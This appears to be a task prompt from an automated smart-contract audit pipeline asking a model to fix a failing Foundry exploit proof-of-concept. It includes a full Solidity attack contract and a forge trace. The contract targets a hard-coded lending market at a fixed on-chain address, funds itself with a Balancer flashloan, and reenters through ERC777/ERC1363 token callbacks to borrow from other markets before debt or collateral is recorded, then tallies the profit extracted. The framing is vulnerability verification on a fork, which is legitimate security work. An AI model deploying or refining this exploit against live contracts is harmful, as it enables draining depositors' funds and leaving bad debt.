You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Borrow and redeem transfer underlying before updating debt/collateral, enabling cross-market reentrancy
- claim: `redeemFresh()` and `borrowFresh()` call `doTransferOut()` before writing the new cToken balance or borrow principal to storage. The per-market `nonReentrant` guard only blocks reentry into the same market, so a callback-capable underlying can reenter a different market while the Comptroller still observes the old collateral or old debt snapshot through `redeemAllowed`/`borrowAllowed` checks.
- impact: A user can redeem collateral or borrow from one market, reenter during the outbound token transfer, and then over-borrow from another market against collateral that is in the process of leaving or before the first borrow is recorded. This can drain liquidity from other markets and leave the protocol with bad debt.
- exploit_paths: ["Call `redeem()` on a market whose underlying triggers a recipient callback, then use the callback to borrow from a different market before `accountTokens[redeemer]` and `totalSupply` are reduced.", "Call `borrow()` on a market whose underlying triggers a recipient callback, then use the callback to borrow from a different market before `accountBorrows[borrower]` and `totalBorrows` are increased."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface ICTokenLike {
    function underlying() external view returns (address);
    function comptroller() external view returns (address);
    function balanceOf(address owner) external view returns (uint256);
    function getCash() external view returns (uint256);
    function mint(uint256 mintAmount, bool enterMarket) external returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens, address borrower) external returns (uint256[] memory);
    function getAllMarkets() external view returns (address[] memory);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IERC777Recipient {
    address public constant TARGET_MARKET = 0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e;
    address public constant ERC1820_REGISTRY = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    bytes32 private constant TOKENS_RECIPIENT_HASH = keccak256("ERC777TokensRecipient");
    bytes4 private constant ERC1363_RECEIVER_MAGIC = 0x88a7ca5c;
    bytes4 private constant MINT_WITH_ENTER_SELECTOR = bytes4(keccak256("mint(uint256,bool)"));
    bytes4 private constant MINT_STANDARD_SELECTOR = bytes4(keccak256("mint(uint256)"));
    bytes4 private constant ENTER_MARKETS_BAO_SELECTOR = bytes4(keccak256("enterMarkets(address[],address)"));
    bytes4 private constant ENTER_MARKETS_STANDARD_SELECTOR = bytes4(keccak256("enterMarkets(address[])"));

    enum PathMode {
        None,
        Redeem,
        Borrow
    }

    enum FundingMode {
        None,
        Direct,
        Balancer
    }

    address private _profitToken;
    uint256 private _profitAmount;

    address public targetUnderlying;
    address public targetComptroller;
    address public chosenVictimMarket;
    address public chosenVictimUnderlying;
    string public exploitPathUsed;
    string public lastFailure;
    bool public hypothesisValidated;
    bool public executed;

    PathMode private activePath;
    FundingMode private activeFunding;

    bool private callbackSeen;
    bool private callbackEntered;
    bool private victimBorrowed;

    uint256 private baselineVictimBalance;
    uint256 private callbackTargetUnderlyingBalance;

    constructor() {
        _refreshTarget();
        _safeRegisterHooks();
    }

    function executeOnOpportunity() external {
        executed = true;
        hypothesisValidated = false;
        chosenVictimMarket = address(0);
        chosenVictimUnderlying = address(0);
        exploitPathUsed = "";
        lastFailure = "";
        _profitToken = address(0);
        _profitAmount = 0;

        _refreshTarget();
        _safeRegisterHooks();

        if (targetUnderlying == address(0) || targetComptroller == address(0)) {
            _setFailure("TARGET_DISCOVERY_FAILED");
            return;
        }

        if (_attemptDirectRedeemPath()) {
            return;
        }

        if (_attemptDirectBorrowPathFromTargetCollateral()) {
            return;
        }

        if (_attemptDirectBorrowPathFromOtherCollateral()) {
            return;
        }

        if (_attemptBalancerRedeemPath()) {
            return;
        }

        if (_attemptBalancerBorrowPath()) {
            return;
        }

        if (bytes(lastFailure).length == 0) {
            _setFailure("NO_PATH_SUCCEEDED");
        }
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "NOT_BALANCER");
        require(activeFunding == FundingMode.Balancer, "FLASH_NOT_ACTIVE");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "BAD_FLASH_ARRAYS");
        require(tokens[0] == targetUnderlying, "UNEXPECTED_FLASH_ASSET");

        _runFlashFundedPath(amounts[0], feeAmounts[0]);
        _safeTransfer(targetUnderlying, BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }

    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        _maybeHandleUnderlyingCallback();
    }

    function tokenFallback(address, uint256, bytes calldata) external {
        _maybeHandleUnderlyingCallback();
    }

    function onTokenTransfer(address, uint256, bytes calldata) external {
        _maybeHandleUnderlyingCallback();
    }

    function onTransferReceived(address, address, uint256, bytes calldata) external returns (bytes4) {
        _maybeHandleUnderlyingCallback();
        return ERC1363_RECEIVER_MAGIC;
    }

    receive() external payable {
        _maybeHandleUnderlyingCallback();
    }

    fallback() external payable {
        _maybeHandleUnderlyingCallback();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptDirectRedeemPath() internal returns (bool) {
        _beginAttempt(PathMode.Redeem, FundingMode.Direct);

        if (!_prepareCollateral(TARGET_MARKET)) {
            // Direct redeem requires verifier-held target-market collateral.
            _setFailure("DIRECT_REDEEM_NO_TARGET_COLLATERAL");
            return false;
        }

        uint256 cTokenBalance = _safeCTokenBalance(TARGET_MARKET, address(this));
        if (cTokenBalance == 0) {
            _setFailure("DIRECT_REDEEM_NO_TARGET_COLLATERAL");
            return false;
        }

        uint256[6] memory numerators = [uint256(1), 9, 1, 1, 1, 1];
        uint256[6] memory denominators = [uint256(1), 10, 2, 4, 10, 100];

        for (uint256 i = 0; i < denominators.length; ++i) {
            uint256 redeemTokens = (cTokenBalance * numerators[i]) / denominators[i];
            if (redeemTokens == 0) {
                continue;
            }

            _resetCallbackState();
            if (!_tryRedeem(TARGET_MARKET, redeemTokens)) {
                continue;
            }

            if (callbackSeen && victimBorrowed) {
                return _finalize(
                    "redeem()->callback->cross-market borrow before accountTokens[redeemer]/totalSupply update"
                );
            }
        }

        // If redeem itself succeeds but callbackSeen stays false, the target underlying did not invoke any
        // recipient hook on outbound transfer at this fork state, so the claimed causality cannot start.
        _setFailure(callbackSeen ? "REDEEM_CALLBACK_CROSS_BORROW_FAILED" : "REDEEM_TRANSFER_DID_NOT_CALLBACK");
        return false;
    }

    function _attemptDirectBorrowPathFromTargetCollateral() internal returns (bool) {
        _beginAttempt(PathMode.Borrow, FundingMode.Direct);

        if (!_prepareCollateral(TARGET_MARKET)) {
            // Direct first-leg borrow requires verifier-held collateral already in the target market.
            _setFailure("DIRECT_BORROW_NO_TARGET_COLLATERAL");
            return false;
        }

        if (_attemptTargetBorrowWithSizing()) {
            return _finalize(
                "borrow()->callback->cross-market borrow before accountBorrows[borrower]/totalBorrows update"
            );
        }

        _setFailure(callbackSeen ? "BORROW_CALLBACK_CROSS_BORROW_FAILED" : "BORROW_TRANSFER_DID_NOT_CALLBACK");
        return false;
    }

    function _attemptDirectBorrowPathFromOtherCollateral() internal returns (bool) {
        address[] memory markets = _getAllMarketsSafe();
        if (markets.length == 0) {
            _setFailure("NO_MARKETS");
            return false;
        }

        for (uint256 i = 0; i < markets.length; ++i) {
            address collateralMarket = markets[i];
            if (collateralMarket == address(0) || collateralMarket == TARGET_MARKET) {
                continue;
            }

            _beginAttempt(PathMode.Borrow, FundingMode.Direct);
            if (!_prepareCollateral(collateralMarket)) {
                continue;
            }

            if (_attemptTargetBorrowWithSizing()) {
                return _finalize(
                    "borrow()->callback->cross-market borrow before accountBorrows[borrower]/totalBorrows update"
                );
            }
        }

        _setFailure(callbackSeen ? "BORROW_CALLBACK_CROSS_BORROW_FAILED" : "BORROW_TRANSFER_DID_NOT_CALLBACK");
        return false;
    }

    function _attemptBalancerRedeemPath() internal returns (bool) {
        uint256 targetCash = _safeGetCash(TARGET_MARKET);
        if (targetCash == 0) {
            _setFailure("TARGET_MARKET_HAS_NO_CASH");
            return false;
        }

        uint256[6] memory divisors = [uint256(2), 4, 10, 20, 50, 100];
        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amount = targetCash / divisors[i];
            if (amount == 0) {
                continue;
            }

            _beginAttempt(PathMode.Redeem, FundingMode.Balancer);
            if (!_runBalancerFlash(amount)) {
                continue;
            }

            if (callbackSeen && victimBorrowed) {
                return _finalize(
                    "flash-funded redeem()->callback->cross-market borrow before accountTokens[redeemer]/totalSupply update"
                );
            }
        }

        return false;
    }

    function _attemptBalancerBorrowPath() internal returns (bool) {
        uint256 targetCash = _safeGetCash(TARGET_MARKET);
        if (targetCash == 0) {
            _setFailure("TARGET_MARKET_HAS_NO_CASH");
            return false;
        }

        uint256[6] memory divisors = [uint256(2), 4, 10, 20, 50, 100];
        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amount = targetCash / divisors[i];
            if (amount == 0) {
                continue;
            }

            _beginAttempt(PathMode.Borrow, FundingMode.Balancer);
            if (!_runBalancerFlash(amount)) {
                continue;
            }

            if (callbackSeen && victimBorrowed) {
                return _finalize(
                    "flash-funded borrow()->callback->cross-market borrow before accountBorrows[borrower]/totalBorrows update"
                );
            }
        }

        return false;
    }

    function _runBalancerFlash(uint256 amount) internal returns (bool) {
        address[] memory tokens = new address[](1);
        tokens[0] = targetUnderlying;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        try IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "") {
            return true;
        } catch {
            _setFailure(activePath == PathMode.Redeem ? "BALANCER_REDEEM_FLASH_FAILED" : "BALANCER_BORROW_FLASH_FAILED");
            return false;
        }
    }

    function _runFlashFundedPath(uint256 amount, uint256 fee) internal {
        require(_tryMint(TARGET_MARKET, amount, true), "FLASH_MINT_FAILED");

        if (activePath == PathMode.Redeem) {
            // The flashloan only bootstraps temporary target-market collateral. The exploit root cause remains:
            // redeem on the target market, let doTransferOut transfer the callback-capable underlying, reenter,
            // and borrow from a different market before target collateral accounting is written.
            uint256 cTokenBalance = _safeCTokenBalance(TARGET_MARKET, address(this));
            require(cTokenBalance != 0, "FLASH_REDEEM_NO_CTOKEN");
            require(_tryRedeem(TARGET_MARKET, cTokenBalance), "FLASH_REDEEM_FAILED");
            require(callbackSeen, "REDEEM_TRANSFER_DID_NOT_CALLBACK");
            require(victimBorrowed, "REDEEM_CALLBACK_CROSS_BORROW_FAILED");
            require(_safeBalanceOf(targetUnderlying, address(this)) >= amount + fee, "FLASH_REPAY_INSUFFICIENT");
            return;
        }

        if (activePath == PathMode.Borrow) {
            // The flashloan only bootstraps temporary collateral. The exploited stale snapshot is still the target
            // market borrow transfer, where reentry must happen before accountBorrows/totalBorrows are increased.
            require(_attemptTargetBorrowWithSizing(), "FLASH_TARGET_BORROW_FAILED");
            require(callbackSeen, "BORROW_TRANSFER_DID_NOT_CALLBACK");
            require(victimBorrowed, "BORROW_CALLBACK_CROSS_BORROW_FAILED");
            require(_safeBalanceOf(targetUnderlying, address(this)) >= amount + fee, "FLASH_REPAY_INSUFFICIENT");
            return;
        }

        revert("NO_ACTIVE_PATH");
    }

    function _attemptTargetBorrowWithSizing() internal returns (bool) {
        uint256 targetCash = _safeGetCash(TARGET_MARKET);
        if (targetCash == 0) {
            return false;
        }

        uint256[7] memory numerators = [uint256(1), 9, 1, 1, 1, 1, 1];
        uint256[7] memory denominators = [uint256(1), 10, 2, 4, 10, 20, 100];

        for (uint256 i = 0; i < denominators.length; ++i) {
            uint256 amount = (targetCash * numerators[i]) / denominators[i];
            if (amount == 0) {
                continue;
            }

            _resetCallbackState();
            if (!_tryBorrow(TARGET_MARKET, amount)) {
                continue;
            }

            if (callbackSeen && victimBorrowed) {
                return true;
            }
        }

        return false;
    }

    function _maybeHandleUnderlyingCallback() internal {
        if (msg.sender != targetUnderlying) {
            return;
        }
        _handleUnderlyingCallback();
    }

    function _handleUnderlyingCallback() internal {
        callbackSeen = true;
        if (callbackEntered) {
            return;
        }

        callbackEntered = true;
        callbackTargetUnderlyingBalance = _safeBalanceOf(targetUnderlying, address(this));

        (bool ok, address market, address underlying_) = _attemptCrossMarketBorrow();
        if (ok) {
            victimBorrowed = true;
            chosenVictimMarket = market;
            chosenVictimUnderlying = underlying_;
        }
    }

    function _attemptCrossMarketBorrow() internal returns (bool, address, address) {
        address[] memory markets = _getAllMarketsSafe();
        if (markets.length == 0) {
            return (false, address(0), address(0));
        }

        uint256[7] memory numerators = [uint256(1), 9, 1, 1, 1, 1, 1];
        uint256[7] memory denominators = [uint256(1), 10, 2, 4, 10, 20, 100];

        for (uint256 pass = 0; pass < 2; ++pass) {
            bool preferDifferentUnderlying = pass == 0;

            for (uint256 i = 0; i < markets.length; ++i) {
                address market = markets[i];
                if (market == address(0) || market == TARGET_MARKET) {
                    continue;
                }

                address underlying_ = _safeUnderlying(market);
                if (underlying_ == address(0)) {
                    continue;
                }

                if (preferDifferentUnderlying) {
                    if (underlying_ == targetUnderlying) {
                        continue;
                    }
                } else if (underlying_ != targetUnderlying) {
                    continue;
                }

                uint256 cash = _safeGetCash(market);
                if (cash == 0) {
                    continue;
                }

                uint256 priorBalance = underlying_ == targetUnderlying
                    ? callbackTargetUnderlyingBalance
                    : _safeBalanceOf(underlying_, address(this));

                for (uint256 j = 0; j < denominators.length; ++j) {
                    uint256 borrowAmount = (cash * numerators[j]) / denominators[j];
                    if (borrowAmount == 0) {
                        continue;
                    }

                    if (_tryBorrow(market, borrowAmount)) {
                        baselineVictimBalance = priorBalance;
                        return (true, market, underlying_);
                    }
                }
            }
        }

        return (false, address(0), address(0));
    }

    function _finalize(string memory label) internal returns (bool) {
        if (chosenVictimUnderlying == address(0)) {
            return false;
        }

        uint256 currentBalance = _safeBalanceOf(chosenVictimUnderlying, address(this));
        if (currentBalance <= baselineVictimBalance) {
            _setFailure("NO_NET_REALIZED_PROFIT");
            return false;
        }

        _profitToken = chosenVictimUnderlying;
        _profitAmount = currentBalance - baselineVictimBalance;
        exploitPathUsed = label;
        hypothesisValidated = true;
        activePath = PathMode.None;
        activeFunding = FundingMode.None;
        return true;
    }

    function _beginAttempt(PathMode path, FundingMode funding) internal {
        activePath = path;
        activeFunding = funding;
        chosenVictimMarket = address(0);
        chosenVictimUnderlying = address(0);
        baselineVictimBalance = 0;
        callbackTargetUnderlyingBalance = _safeBalanceOf(targetUnderlying, address(this));
        _resetCallbackState();
    }

    function _prepareCollateral(address market) internal returns (bool) {
        address underlying_ = _safeUnderlying(market);
        if (underlying_ == address(0)) {
            return false;
        }

        uint256 looseUnderlying = _safeBalanceOf(underlying_, address(this));
        if (looseUnderlying != 0 && !_tryMint(market, looseUnderlying, true)) {
            return false;
        }

        _tryEnterMarket(market);
        return _safeCTokenBalance(market, address(this)) != 0;
    }

    function _resetCallbackState() internal {
        callbackSeen = false;
        callbackEntered = false;
        victimBorrowed = false;
    }

    function _refreshTarget() internal {
        targetUnderlying = _safeUnderlying(TARGET_MARKET);
        targetComptroller = _safeComptroller(TARGET_MARKET);
    }

    function _safeRegisterHooks() internal {
        (bool ok, ) = ERC1820_REGISTRY.call(
            abi.encodeWithSelector(
                IERC1820Registry.setInterfaceImplementer.selector,
                address(this),
                TOKENS_RECIPIENT_HASH,
                address(this)
            )
        );
        ok;
    }

    function _getAllMarketsSafe() internal view returns (address[] memory markets) {
        if (targetComptroller == address(0)) {
            return new address[](0);
        }

        (bool ok, bytes memory data) = targetComptroller.staticcall(
            abi.encodeWithSelector(IComptrollerLike.getAllMarkets.selector)
        );
        if (!ok || data.length == 0) {
            return new address[](0);
        }

        return abi.decode(data, (address[]));
    }

    function _safeUnderlying(address market) internal view returns (address) {
        if (market == address(0)) {
            return address(0);
        }

        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.underlying.selector));
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _safeComptroller(address market) internal view returns (address) {
        if (market == address(0)) {
            return address(0);
        }

        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.comptroller.selector));
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _safeCTokenBalance(address market, address owner) internal view returns (uint256) {
        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.balanceOf.selector, owner));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeGetCash(address market) internal view returns (uint256) {
        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.getCash.selector));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeBalanceOf(address token, address owner) internal view returns (uint256) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, owner));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _tryMint(address market, uint256 amount, bool enterMarket) internal returns (bool) {
        address underlying_ = _safeUnderlying(market);
        if (underlying_ == address(0) || amount == 0) {
            return false;
        }

        _forceApprove(underlying_, market, amount);

        bool minted = _callReturnsZeroOrEmpty(
            market,
            abi.encodeWithSelector(MINT_WITH_ENTER_SELECTOR, amount, enterMarket)
        );
        if (!minted) {
            minted = _callReturnsZeroOrEmpty(market, abi.encodeWithSelector(MINT_STANDARD_SELECTOR, amount));
        }
        if (!minted) {
            return false;
        }

        // Entering the market is a required public setup step so supplied collateral counts for the later borrow.
        _tryEnterMarket(market);
        return true;
    }

    function _tryRedeem(address market, uint256 redeemTokens) internal returns (bool) {
        if (redeemTokens == 0) {
            return false;
        }

        return _callReturnsZeroOrEmpty(market, abi.encodeWithSelector(ICTokenLike.redeem.selector, redeemTokens));
    }

    function _tryBorrow(address market, uint256 amount) internal returns (bool) {
        if (amount == 0) {
            return false;
        }

        return _callReturnsZeroOrEmpty(market, abi.encodeWithSelector(ICTokenLike.borrow.selector, amount));
    }

    function _tryEnterMarket(address market) internal returns (bool) {
        if (market == address(0)) {
            return false;
        }

        address comptroller_ = _safeComptroller(market);
        if (comptroller_ == address(0)) {
            comptroller_ = targetComptroller;
        }
        if (comptroller_ == address(0)) {
            return false;
        }

        address[] memory markets = new address[](1);
        markets[0] = market;

        (bool ok, bytes memory data) = comptroller_.call(
            abi.encodeWithSelector(ENTER_MARKETS_BAO_SELECTOR, markets, address(this))
        );
        if (_enterMarketsSucceeded(ok, data)) {
            return true;
        }

        (ok, data) = comptroller_.call(abi.encodeWithSelector(ENTER_MARKETS_STANDARD_SELECTOR, markets));
        return _enterMarketsSucceeded(ok, data);
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 currentAllowance;
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.allowance.selector, address(this), spender)
        );
        if (ok && data.length >= 32) {
            currentAllowance = abi.decode(data, (uint256));
        }

        if (currentAllowance >= amount) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callReturnsZeroOrEmpty(address target, bytes memory callData) internal returns (bool) {
        (bool ok, bytes memory data) = target.call(callData);
        if (!ok) {
            return false;
        }
        if (data.length == 0) {
            return true;
        }
        if (data.length < 32) {
            return false;
        }
        return abi.decode(data, (uint256)) == 0;
    }

    function _enterMarketsSucceeded(bool ok, bytes memory data) internal pure returns (bool) {
        if (!ok || data.length == 0) {
            return false;
        }

        uint256[] memory results = abi.decode(data, (uint256[]));
        if (results.length == 0) {
            return false;
        }

        for (uint256 i = 0; i < results.length; ++i) {
            if (results[i] != 0) {
                return false;
            }
        }
        return true;
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, "TOKEN_CALL_FAILED");
        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), "TOKEN_CALL_FALSE");
        }
    }

    function _setFailure(string memory reason) internal {
        if (bytes(reason).length != 0) {
            lastFailure = reason;
        }
    }
}

```

forge stdout (tail):
```
  └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2427] 0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b::comptroller() [staticcall]
    │   │   └─ ← [Return] 0x8e8C327AD3Fa97092cdAba70efCf82DaC3081fa1
    │   ├─ [50821] 0x8e8C327AD3Fa97092cdAba70efCf82DaC3081fa1::enterMarkets([0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [50107] 0xB814C49eBC3b407a764d8F449565Ce3F03907B91::enterMarkets([0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   ├─  emit topic 0: 0x3ab23ab0d51cccc0c3085aec51f99228625aa1a922b3a8ca89a26b0f2027a1a5
    │   │   │   │           data: 0x000000000000000000000000f7548a6e9daf2e4689cedd8a08189d0d6f3ee91b0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   └─ ← [Return] [0]
    │   │   └─ ← [Return] [0]
    │   ├─ [8574] 0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [6145] 0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b::0933c1ed(0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002470a082310000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   ├─ [2488] 0xDb3401beF8f66E7f6CD95984026c26a4F47eEe84::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0
    │   ├─ [8568] 0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e::getCash() [staticcall]
    │   │   ├─ [6425] 0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e::0933c1ed(000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000043b1d21a200000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   ├─ [4856] 0xDb3401beF8f66E7f6CD95984026c26a4F47eEe84::getCash() [delegatecall]
    │   │   │   │   ├─ [3991] 0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8::balanceOf(0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e) [staticcall]
    │   │   │   │   │   ├─ [3074] 0x1f863776975A69b6078FdAfAb6298d3E823E0190::balanceOf(0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e) [delegatecall]
    │   │   │   │   │   │   ├─ [2584] 0xa6969A3f8B4E32204DBC1D83C21443D303b840e5::balanceOf(0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0
    │   ├─ [6568] 0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e::getCash() [staticcall]
    │   │   ├─ [4425] 0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e::0933c1ed(000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000043b1d21a200000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   ├─ [2856] 0xDb3401beF8f66E7f6CD95984026c26a4F47eEe84::getCash() [delegatecall]
    │   │   │   │   ├─ [1991] 0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8::balanceOf(0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e) [staticcall]
    │   │   │   │   │   ├─ [1074] 0x1f863776975A69b6078FdAfAb6298d3E823E0190::balanceOf(0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e) [delegatecall]
    │   │   │   │   │   │   ├─ [584] 0xa6969A3f8B4E32204DBC1D83C21443D303b840e5::balanceOf(0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [381] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [380] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3.underlying
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 9.44s (12.76ms CPU time)

Ran 1 test suite in 9.54s (9.44s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1040561020)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
